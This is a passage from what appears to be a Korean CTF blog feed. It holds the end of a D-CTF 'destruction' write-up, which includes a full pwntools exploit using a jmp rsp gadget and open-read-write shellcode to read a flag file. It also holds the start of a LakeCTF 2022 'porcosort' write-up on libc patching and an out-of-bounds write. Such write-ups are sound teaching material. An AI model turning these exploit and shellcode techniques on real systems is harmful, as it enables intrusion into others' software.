class="line">‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ[ DISASM ]‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ</span><br><span class="line">   0x4008ef    test   eax, eax</span><br><span class="line">   0x4008f1    jne    0x4008fa                      &lt;0x4008fa&gt;</span><br><span class="line"> </span><br><span class="line">   0x4008f3    mov    eax, 0</span><br><span class="line">   0x4008f8    jmp    0x400909                      &lt;0x400909&gt;</span><br><span class="line">    ‚Üì</span><br><span class="line">   0x400909    leave  </span><br><span class="line"> ‚ñ∫ 0x40090a    ret    &lt;0x4242424242424242&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ[ STACK ]‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ</span><br><span class="line">00:0000‚îÇ rsp 0x7ffeb9170008 ‚óÇ‚Äî 0x4242424242424242 (&#x27;BBBBBBBB&#x27;)</span><br><span class="line">01:0008‚îÇ     0x7ffeb9170010 ‚óÇ‚Äî 0x4343434343434343 (&#x27;CCCCCCCC&#x27;)</span><br><span class="line">02:0010‚îÇ     0x7ffeb9170018 ‚Äî‚ñ∏ 0x7ffeb91700f8 ‚Äî‚ñ∏ 0x7ffeb9170565 ‚óÇ‚Äî &#x27;./destruction&#x27;</span><br><span class="line">03:0018‚îÇ     0x7ffeb9170020 ‚óÇ‚Äî 0x190f647a0</span><br><span class="line">04:0020‚îÇ     0x7ffeb9170028 ‚Äî‚ñ∏ 0x400886 ‚óÇ‚Äî push   rbp</span><br><span class="line">05:0028‚îÇ     0x7ffeb9170030 ‚Äî‚ñ∏ 0x400910 ‚óÇ‚Äî push   r15</span><br><span class="line">06:0030‚îÇ     0x7ffeb9170038 ‚óÇ‚Äî 0x29e4545047266017</span><br><span class="line">07:0038‚îÇ     0x7ffeb9170040 ‚Äî‚ñ∏ 0x4005c0 ‚óÇ‚Äî xor    ebp, ebp</span><br></pre></td></tr></table></figure><p>ÎãπÏó∞ÌïòÍ≤åÎèÑ ret ÏûêÎ¶¨Ïóê Î∞îÎ°ú ÏâòÏΩîÎìúÎ•º ÎÑ£ÏúºÎ©¥ ÏïàÎêúÎã§. <code>jmp rsp</code>ÎùºÎäî Ï¢ãÏùÄ Í∞ÄÏ†ØÏù¥ Ï°¥Ïû¨Ìï¥ÏÑú Í∑∏Í≤ÉÏùÑ ÏÇ¨Ïö©Ìï¥Ïïº ÌïúÎã§. Í∑∏Îü¨Î©¥ <code>rsp</code>Î°ú jump ÌïòÏó¨ Í∑∏ Ï£ºÏÜåÏóê Ï†ÄÏû•Îêú ÏΩîÎìúÎ•º Ïã§ÌñâÌïòÎ†§Í≥† Ìï† Í≤ÉÏù¥Îã§. ÎßåÏïΩ <code>0x4242424242424242</code> ÎåÄÏã† <code>jmp rsp</code> Í∞ÄÏ†Ø Ï£ºÏÜåÎ•º ÎÑ£ÎäîÎã§Î©¥? </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7ffeb9170008: 0x4141414141414141 0x0000000000400882 // jmp    rsp</span><br><span class="line">0x7ffeb9170010: 0x4343434343434343 ...</span><br></pre></td></tr></table></figure><p><code>0x4343434343434343</code> Í∞Ä Ïã§ÌñâÎê† Í≤ÉÏù¥Îã§.</p><p>ÏïÑÎ¨¥Ìäº Ïù¥Í±∞Ïóê Ïú†ÏùòÌï¥ÏÑú <code>ret</code>Ïóê <code>jmp rsp</code> Ï£ºÏÜåÎ•º ÎÑ£Ïñ¥Ï£ºÎ©¥ ÎêúÎã§. Í∑∏Îü¨Î©¥ Ïö∞Î¶¨Í∞Ä Ï†ÅÏùÑ Ïàò ÏûàÎäî Î∞îÏù¥Ìä∏ ÏàòÎäî Ïò§ÏßÅ 8Î∞îÏù¥Ìä∏ÎßåÏù¥ ÎÇ®ÎäîÎã§. </p><p>ÌùîÌïú Ìä∏Î¶≠ÏùÄ ÌÅ∞ Î∞îÏù¥Ìä∏Î•º ÏûÖÎ†•Ìï† Ïàò ÏûàÎäî <code>read</code> syscallÏùÑ Ìò∏Ï∂úÌïòÎäî Í≤ÉÏù¥Îã§. Ïù¥Í±∏ 8Î∞îÏù¥Ìä∏Î°ú Íµ¨ÏÑ±ÌïòÎ©¥ ÎêúÎã§. <code>read</code> syscallÏùÑ Íµ¨ÏÑ±ÌïòÎäî Îç∞ÏóêÎäî 3Í∞úÏùò Ïù∏ÏàòÍ∞Ä ÌïÑÏöîÌïòÎã§. ÏïÑÎãà syscallÏù∏Íπå 4Í∞úÍ∞Ä ÌïÑÏöîÌïòÎã§.</p><p><code>rax</code>, <code>rdi</code>, <code>rsi</code>, <code>rdx</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RAX  0x0</span><br><span class="line">RDI  0x400a09 ‚óÇ‚Äî outsd  dx, dword ptr fs:[rsi] /* &#x27;done&#x27; */</span><br><span class="line">RSI  0x7ffd095c5020 ‚óÇ‚Äî 0x41414100656e6f64 /* &#x27;done&#x27; */</span><br><span class="line">RDX  0x4</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">asm(&#x27;&#x27;&#x27;</span><br><span class="line">    xor rdi, rdi</span><br><span class="line">    mov dh, 0x2</span><br><span class="line">    syscall</span><br><span class="line">    &#x27;&#x27;&#x27;)</span><br></pre></td></tr></table></figure><p><code>dh</code>Ïóê 0x2Î•º ÎåÄÏûÖÌïòÎ©¥ <code>rdx</code>Îäî Í≤∞Íµ≠ 0x00000204Í∞Ä ÎêúÎã§. </p><p>flag ÏúÑÏπòÎäî Î¨∏Ï†úÏóêÏÑú ÏïåÎ†§Ï§¨ÏúºÎãà, Í∑∏ Ïù¥ÌõÑÏóî seccompÏóê Î™ÖÏãúÎêú syscallÎì§ÏùÑ ÏÇ¨Ïö©ÌïòÎ©¥ÏÑú Ìé∏ÌïòÍ≤å ORW ÌïòÎ©¥ ÎêúÎã§.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./destruction&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./destruction&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;done\x00&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span> * (<span class="number">0x28</span>-<span class="built_in">len</span>(payload))</span><br><span class="line"><span class="comment">#payload += &#x27;B&#x27; * 0x8 # ret</span></span><br><span class="line">payload += p64(<span class="number">0x400882</span>) <span class="comment"># jmp rsp</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">payload += asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        xor rdi, rdi</span></span><br><span class="line"><span class="string">        mov dh, 0x2</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;</span></span><br><span class="line">shellcode += <span class="string">&#x27;\x90&#x27;</span>*<span class="number">100</span></span><br><span class="line">shellcode += asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        xor rdx, rdx</span></span><br><span class="line"><span class="string">        xor rsi, rsi</span></span><br><span class="line"><span class="string">        push rsi</span></span><br><span class="line"><span class="string">        mov rax, 0x7478742e67616c66</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        mov rdi, rsp</span></span><br><span class="line"><span class="string">        mov rax, 0x2</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        mov rdi, rax</span></span><br><span class="line"><span class="string">        xor rax, rax</span></span><br><span class="line"><span class="string">        mov rdx, 0x60</span></span><br><span class="line"><span class="string">        mov rsi, rsp</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        mov rax, 1</span></span><br><span class="line"><span class="string">        mov rdi, 1</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>Team P3WP3W‚Äôs writeups (no link)</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> D-CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> seccomp </tag>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LakeCTF 2022 - porcosort (Dockerfile, libc, oob)</title>
      <link href="/221004-lakectf2022-porcosort/"/>
      <url>/221004-lakectf2022-porcosort/</url>
      
        <content type="html"><![CDATA[<p>Î∂ÑÏÑù ÌôòÍ≤Ω: Windows 11, Ubuntu 22.04<br>ÏÇ¨Ïö©Ïûê Ï†úÍ≥µ ÌååÏùº: Î∞îÏù¥ÎÑàÎ¶¨, ÎèÑÏª§ÌååÏùº</p><h2 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h2><p>libc ÎïåÎ¨∏Ïóê.. Í≥†ÏÉùÏùÑ Ï¢Ä ÌñàÏßÄÎßå Í≤∞Î°†Ï†ÅÏúºÎ°úÎäî Ïûò Ìï¥Í≤∞ÌñàÎã§. </p><p>Îß® Ï≤òÏùåÏóê Ubuntu 20.04ÏóêÏÑú Î∂ÑÏÑù Î∞è ÏùµÏä§ ÏßÑÌñâÌïòÎ†§Í≥† ÌñàÎäîÎç∞ Ïã§ÌñâÏù¥ Ïûò ÎêòÏßÄ ÏïäÏïÑ Í∑∏ÎÉ• Ubuntu 22.04ÏóêÏÑú ÏßÑÌñâÌñàÎã§. Î≤ÑÏ†ÑÏùÑ Ïò¨Î¶∞ Ïù¥Ïú†Îäî 20.04ÏóêÏÑú Ïã§ÌñâÌï† Îïå GLibc? Í∑∏ Î≤ÑÏ†ÑÏù¥ ÎÇÆÏïÑÏÑú Ïã§ÌñâÏù¥ ÏïàÎêúÎã§Í≥† ÏóêÎü¨ Î¨∏Íµ¨Í∞Ä Îñ¥Í∏∞ ÎïåÎ¨∏Ïóê ÎãπÏó∞ÌïòÍ≤åÎèÑ(?) 22.04Î°ú Î≤ÑÏ†ÑÏùÑ Ïò¨Î¶¥ ÏÉùÍ∞ÅÏùÑ ÌïòÏòÄÍ∏∞ ÎïåÎ¨∏Ïù¥Îã§. ÌïòÏßÄÎßå Í≤∞Î°†Ï†ÅÏúºÎ°ú Ubuntu 22.04Ïùò libcÎèÑ ÏïÑÎãàÏóàÍ∏∞ ÎïåÎ¨∏Ïóê(archÏùò libcÏòÄÏùå) Íµ≥Ïù¥ 22.04Î°ú Î≤ÑÏ†ÑÏùÑ ÏïàÏò¨Î¶¨Í≥† Î¨∏Ï†úÎ•º ÌíÄ ÏàòÎèÑ ÏûàÏóàÎã§.</p><p>ctf Ï±åÎ¶∞ÏßÄÏóêÏÑú ÎèÑÏª§ÌååÏùºÏùÑ Ï†úÍ≥µÌïòÎäî Ïù¥Ïú†Îäî libc Î≤ÑÏ†Ñ ÎïåÎ¨∏Ïù¥Îã§. libc ÌååÏùºÏùÑ ÎçòÏ†∏Ï§Ä Í≤ÉÏùÄ ÏïÑÎãàÏßÄÎßå libcÎ•º Í±∞Ï†∏Ï§Ä Í≤ÉÏù¥ÎÇò Îã§Î¶ÑÏóÜÎã§. ÏïåÍ≥†ÏûàÏóàÏßÄÎßå ÌôúÏö©ÌïòÎäî Î∞©Î≤ïÏùÑ Ï†úÎåÄÎ°ú ÏïåÏßÄ Î™ªÌñàÎã§. libc ÎïåÎ¨∏Ïóê ÏÇΩÏßàÏùÑ ÎßéÏù¥ Ìï¥ÏÑú Í≤∞Íµ≠ Î°∏ÏóÖÏùÑ Ï∞æÏïÑÎ≥¥Í≥† Ìï¥Îãπ Î∂ÄÎ∂ÑÏùÑ Î∞îÎ°ú Ìï¥Í≤∞Ìï† Ïàò ÏûàÏóàÎã§. </p><p><a href="https://blog.csotiriou.com/post/lakectf-2022-qualifier-porcosort-pwn/#1-setup">https://blog.csotiriou.com/post/lakectf-2022-qualifier-porcosort-pwn/#1-setup</a></p><p>Ïù¥Î≤à Í∏∞ÌöåÎ°ú ÎèÑÏª§ÌååÏùºÏùÑ ÎààÏó¨Í≤®Î¥êÏïºÍ≤†Îã§Îäî ÏÉùÍ∞ÅÍ≥º libcÎ•º Í∞ÄÏ†∏Ïò§Í≥† patchÌïòÎäî Î∞©Î≤ïÏùÑ Î∞∞Ïõ†Îã§. Ïù¥Ï†úÎùºÎèÑ ÏïåÍ≤å ÎêòÏñ¥ÏÑú Îã§ÌñâÏù¥Îã§.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Î°úÏª¨ÏóêÏÑú-Î¨∏Ï†ú-ÌôòÍ≤Ω-ÏÑ∏ÌåÖÌïòÍ∏∞-feat-ÎèÑÏª§ÌååÏùºÏù¥-Ï£ºÏñ¥Ï°åÏùÑ-Îïå-libc-Í∞ÄÏ†∏Ïò§Í∏∞"><a href="#Î°úÏª¨ÏóêÏÑú-Î¨∏Ï†ú-ÌôòÍ≤Ω-ÏÑ∏ÌåÖÌïòÍ∏∞-feat-ÎèÑÏª§ÌååÏùºÏù¥-Ï£ºÏñ¥Ï°åÏùÑ-Îïå-libc-Í∞ÄÏ†∏Ïò§Í∏∞" class="headerlink" title="Î°úÏª¨ÏóêÏÑú Î¨∏Ï†ú ÌôòÍ≤Ω ÏÑ∏ÌåÖÌïòÍ∏∞ (feat. ÎèÑÏª§ÌååÏùºÏù¥ Ï£ºÏñ¥Ï°åÏùÑ Îïå libc Í∞ÄÏ†∏Ïò§Í∏∞)"></a>Î°úÏª¨ÏóêÏÑú Î¨∏Ï†ú ÌôòÍ≤Ω ÏÑ∏ÌåÖÌïòÍ∏∞ (feat. ÎèÑÏª§ÌååÏùºÏù¥ Ï£ºÏñ¥Ï°åÏùÑ Îïå libc Í∞ÄÏ†∏Ïò§Í∏∞)</h3><p>Ubuntu 22.04ÏóêÏÑú <code>ldd</code> Î™ÖÎ†πÏùÑ ÌÜµÌï¥ Î∞îÏù¥ÎÑàÎ¶¨Ïóê Îß§ÌïëÎêú ÎùºÏù¥Î∏åÎü¨Î¶¨Î•º Ïïå Ïàò ÏûàÎã§. Ubuntu 20.04ÏóêÏÑú ÏßÑÌñâÌñàÏùÑ ÎïåÎäî Î≤ÑÏ†ÑÏóê ÎßûÎäî libcÍ∞Ä ÏóÜÏñ¥ÏÑú Ïã§ÌñâÏ°∞Ï∞® ÎêòÏßÄ ÏïäÏïòÎäîÎç∞, Ïó¨Í∏∞ÏÑ† Í∑∏ÎûòÎèÑ Ïã§ÌñâÏùÄ ÎêúÎã§. ÌïòÏßÄÎßå ÏïÑÎ¨¥Î¶¨ Ïã§ÌñâÏù¥ ÎêòÎçîÎùºÎèÑ remoteÏôÄ ÌôòÍ≤ΩÏù¥ Îã§Î•º ÏàòÎèÑ ÏûàÍ∏∞ ÎïåÎ¨∏Ïóê Ï†úÍ≥µÎêú ÎèÑÏª§ÌååÏùºÏùÑ Íº≠ ÌôïÏù∏Ìï¥Ïïº ÌïúÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@22:~/ctf/lake/porcosort2$ ldd porcosort </span><br><span class="line">linux-vdso.so.1 (0x00007ffc8615e000)</span><br><span class="line">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f976d66e000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x00007f976d8ad000)</span><br></pre></td></tr></table></figure><p>ÎèÑÏª§ÌååÏùºÏùÑ ÌôïÏù∏Ìï¥Î≥¥Ïûê.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FROM docker.io/library/archlinux@sha256:2bfe247c46221b0770325d69ec195b50455b2865588665e6926b2d1168982e67 AS builder</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>Î¨∏Ï†ú ÌôòÍ≤ΩÏù¥ UbuntuÍ∞Ä ÏïÑÎãàÎùº arch linuxÏûÑÏùÑ Ïïå Ïàò ÏûàÎã§. Ï†ÄÍ∏∞Î°ú Ï†ëÏÜçÌï¥ÏÑú libcÎ•º Í∞ÄÏ†∏ÏôÄ Î∞îÏù¥ÎÑàÎ¶¨Î•º patchÌïòÎäî ÏûëÏóÖÏùÑ ÏßÑÌñâÌïòÏûê.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm -v `pwd`:/data archlinux@sha256:2bfe247c46221b0770325d69ec195b50455b2865588665e6926b2d1168982e67 bash</span><br></pre></td></tr></table></figure><p>ÎèÑÏª§Î•º Ïã§ÌñâÌïòÎ©¥ Ïª®ÌÖåÏù¥ÎÑàÏóê Ï†ëÏÜçÌï† Ïàò ÏûàÎã§.<br>Îã§Î•∏ ÌÑ∞ÎØ∏ÎÑê Ï∞ΩÏùÑ Ïó¥Ïñ¥ÏÑú Ïª®ÌÖåÏù¥ÎÑàÎ°ú Î¨∏Ï†ú Î∞îÏù¥ÎÑàÎ¶¨Î•º ÎÑ£Ïñ¥Ï£ºÍ≥† <code>ldd</code> Î™ÖÎ†πÏñ¥Î°ú Îß§ÌïëÎêú ÎùºÏù¥Î∏åÎü¨Î¶¨Î•º ÌôïÏù∏Ìï¥Î≥¥Ïûê.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp /home/jir4vvit/ctf/lake/porcosort2/porcorsort ce9c17249f0e:/home/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@ce9c17249f0e home]# ldd porcosort</span><br><span class="line">linux-vdso.so.1 (0x00007fff4e6ca000)</span><br><span class="line">libc.so.6 =&gt; /usr/lib/libc.so.6 (0x00007f2f35895000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007f2f35aae000)</span><br></pre></td></tr></table></figure><p>Îã§Î•∏ ÌÑ∞ÎØ∏ÎÑêÏóêÏÑú ÏïÑÎûò Îëê Î™ÖÎ†πÏñ¥Î°ú Ïª®ÌÖåÏù¥ÎÑà ÏïàÏùò ldÏôÄ libc ÌååÏùºÏùÑ Í∞ÄÏ†∏Ïò§Ïûê.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker cp ce9c17249f0e:/usr/lib/libc.so.6 /home/jir4vvit/ctf/lake/porcosort2/</span><br><span class="line">docker cp ce9c17249f0e:/usr/lib64/ld-linux-x86-64.so.2 /home/jir4vvit/ctf/lake/porcosort2/</span><br></pre></td></tr></table></figure><p>Í∑∏Îüº Ïù¥Ï†ú Î°úÏª¨Ïóê ldÏôÄ libcÍ∞Ä Ï†ÄÏû•Ïù¥ ÎêòÍ≥†, <code>patchelf</code>Î•º Ïù¥Ïö©Ìï¥ÏÑú Î∞îÏù¥ÎÑàÎ¶¨Î•º Ìå®ÏπòÌï† Ïàò ÏûàÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@22:~/ctf/lake/porcosort2$ patchelf --set-rpath . --replace-needed libc.so.6 ./libc.so.6 porcosort</span><br><span class="line">jir4vvit@22:~/ctf/lake/porcosort2$ patchelf --set-rpath . --set-interpreter ./ld-linux-x86-64.so.2 porcosort</span><br><span class="line">jir4vvit@22:~/ctf/lake/porcosort2$ ldd porcosort </span><br><span class="line">linux-vdso.so.1 (0x00007ffff7d92000)</span><br><span class="line">./libc.so.6 (0x00007f3122b16000)</span><br><span class="line">./ld-linux-x86-64.so.2 =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007f3122d2f000)</span><br></pre></td></tr></table></figure><p><code>--set-interpreter &lt;ld&gt;</code>: Îã§Ïö¥Î∞õÏùÄ ld(Î°úÎçî)Î•º ÏßÄÏ†ï<br><code>--replace-needed &lt;libc&gt;</code>: libc ÍµêÏ≤¥ </p><p>Í∑∏Îüº Ïù¥Ï†ú Î¨∏Ï†ú ÌôòÍ≤Ω(remote)ÏôÄ localÏù¥ ÎòëÍ∞ôÏïÑÏ°åÎã§! Í∞ÄÏ†Ø Ï∞æÏùÑ Ïùº ÏûàÏúºÎ©¥ Í∞ÄÏ†∏Ïò® libcÎÇò ldÏóêÏÑú Í∞ÄÏ†ØÏ∞æÏúºÎ©¥ ÎêúÎã§.</p><h3 id="Î≥¥Ìò∏-Í∏∞Î≤ï"><a href="#Î≥¥Ìò∏-Í∏∞Î≤ï" class="headerlink" title="Î≥¥Ìò∏ Í∏∞Î≤ï"></a>Î≥¥Ìò∏ Í∏∞Î≤ï</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>Ï†ÑÎ∂Ä Îã§ Í±∏Î†§ÏûàÎã§. :(</p><h3 id="Ï∑®ÏïΩÏ†ê"><a href="#Ï∑®ÏïΩÏ†ê" class="headerlink" title="Ï∑®ÏïΩÏ†ê"></a>Ï∑®ÏïΩÏ†ê</h3><p>Ïö∞Î¶¨Ïùò ÏπúÍµ¨ IDAÏôÄ Ìï®Íªò Ï∞®Í∑ºÏ∞®Í∑º Î∂ÑÏÑùÌïòÎ©¥ÏÑú Ï∑®ÏïΩÏ†êÏùÑ Ï∞æÏïÑÎ≥¥Ïûê.</p><h4 id="vuln-Ìï®Ïàò"><a href="#vuln-Ìï®Ïàò" class="headerlink" title="vuln Ìï®Ïàò"></a>vuln Ìï®Ïàò</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">vuln</span><span class="params">(<span class="type">unsigned</span> __int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-1A4h]</span></span><br><span class="line">  __int64 stack_buf[<span class="number">48</span>]; <span class="comment">// [rsp+20h] [rbp-1A0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 sort_cnt; <span class="comment">// [rsp+1A0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 canary; <span class="comment">// [rsp+1A8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">47</span>; ++i )</span><br><span class="line">    stack_buf[i] = _bss_start;</span><br><span class="line">  __asm &#123; rdrand  rbx &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Have a gift: %p\n&quot;</span>, stack_buf[(_RBX ^ a1) % <span class="number">0x30</span>]);<span class="comment">// _IO_2_1_stdout_</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;How many numbers to sort? &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%lld&quot;</span>, &amp;sort_cnt);            <span class="comment">// 48</span></span><br><span class="line">  <span class="keyword">if</span> ( sort_cnt &gt; <span class="number">48</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  read_numbers(stack_buf, sort_cnt);</span><br><span class="line">  get_gnomed(stack_buf, sort_cnt);              <span class="comment">// Ï†ïÎ†¨ÌïòÎäî ÏΩîÎìú</span></span><br><span class="line">                                                <span class="comment">// Ïó¨Í∏∞ sort_cnt Í∞í Ï°∞Ïûë Í∞ÄÎä• (48Î≥¥Îã§ ÌÅ∞ Ïàò ÎÑ£Í∏∞ Í∞ÄÎä•)</span></span><br><span class="line">                                                <span class="comment">// Ï†ïÌôïÌûàÎäî read_numbersÏóêÏÑú oob write Î∞úÏÉù</span></span><br><span class="line">  <span class="keyword">return</span> canary - 